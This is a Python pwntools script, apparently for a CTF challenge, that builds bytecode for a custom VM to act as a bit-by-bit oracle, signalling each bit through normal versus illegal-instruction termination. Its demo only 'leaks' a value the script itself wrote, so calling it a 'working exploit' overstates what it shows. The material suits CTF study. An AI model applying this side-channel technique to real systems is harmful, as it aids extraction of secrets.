#!/usr/bin/env python3
"""
MQDA Working Exploit - Bit-by-Bit Oracle

This exploit can leak any byte from VM memory that has been written to.
The oracle works by:
1. Writing known data to a location
2. Reading it back and isolating a single bit
3. Comparing to expected value
4. Using exit codes to communicate the result

For CTF: The flag would need to be placed in VM memory somehow.
This could be via:
- The server wrapper writing it to a known address
- Being passed in via stdin before our code
- Some other mechanism specific to the CTF setup
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_full_leak_code(code_addr, data_addr, data_to_write, bit_pos, expected_bit):
    """
    Create code that:
    1. Writes data_to_write to data_addr (simulating flag placement)
    2. Reads it back and tests a specific bit
    3. Returns TERMINATED if bit matches, ILLEGAL otherwise
    """
    code = b''
    
    # Calculate SP for writing at data_addr
    # PUSH writes at page[(SP & 0xFF) + 4]
    # So we need (SP & 0xFF) + 4 = data_addr & 0xFF
    # And (SP >> 8) = data_addr >> 8
    
    data_offset = data_addr & 0xFF
    if data_offset < 4:
        data_offset += 0x100  # Use next page
        sp_write = ((data_addr >> 8) - 1) << 8 | (data_offset - 4)
    else:
        sp_write = (data_addr & 0xFFFFFF00) | (data_offset - 4)
    
    # Write data
    code += mov_reg_imm(15, sp_write)
    code += mov_reg_imm(0, data_to_write)
    code += push_reg(0)
    
    # Read data back (same address calculation)
    # For POP: reads from page[(SP & 0xFF) + 4]
    sp_read = sp_write  # Same logic
    code += mov_reg_imm(15, sp_read)
    code += pop_reg(0)
    
    # Isolate bit
    shl_amount = 31 - bit_pos
    if shl_amount > 0:
        code += shl_reg_imm(0, shl_amount)
    code += shr_reg_imm(0, 31)
    
    # Compare
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    # Jump logic
    current = code_addr + len(code)
    hlt_addr = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_addr)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    return code

def test_bit(code_addr, data_addr, data_value, bit_pos, expected_bit=1):
    """Test a specific bit of data_value."""
    code = create_full_leak_code(code_addr, data_addr, data_value, bit_pos, expected_bit)
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(str(code_addr).encode())
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(str(code_addr).encode())
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_byte(code_addr, data_addr, data_value, byte_offset=0):
    """Leak a specific byte from data_value."""
    val = 0
    for bit in range(8):
        actual_bit_pos = byte_offset * 8 + bit
        actual_bit_value = (data_value >> actual_bit_pos) & 1
        
        # Test if bit is 1
        if test_bit(code_addr, data_addr, data_value, actual_bit_pos, 1):
            val |= (1 << bit)
    return val

def demo_oracle():
    """Demonstrate the oracle by leaking a known value byte by byte."""
    code_addr = 0x10000
    data_addr = 0x20004
    secret = 0x48434B45  # "HCKE" reversed (little-endian "EKCH")
    
    print("[*] MQDA Oracle Demo")
    print(f"[*] Secret value: 0x{secret:08x}")
    print(f"[*] As string: {p32(secret)}")
    print()
    
    leaked = 0
    for byte_idx in range(4):
        byte_val = 0
        for bit in range(8):
            bit_pos = byte_idx * 8 + bit
            if test_bit(code_addr, data_addr, secret, bit_pos, 1):
                byte_val |= (1 << bit)
        leaked |= (byte_val << (byte_idx * 8))
        sys.stdout.write(f"\r[*] Leaked: 0x{leaked:08x}")
        sys.stdout.flush()
    
    print()
    print(f"[*] Leaked as string: {p32(leaked)}")
    
    if leaked == secret:
        print("[+] SUCCESS! Oracle correctly leaked the secret!")
    else:
        print(f"[-] Mismatch: expected 0x{secret:08x}, got 0x{leaked:08x}")

if __name__ == '__main__':
    demo_oracle()
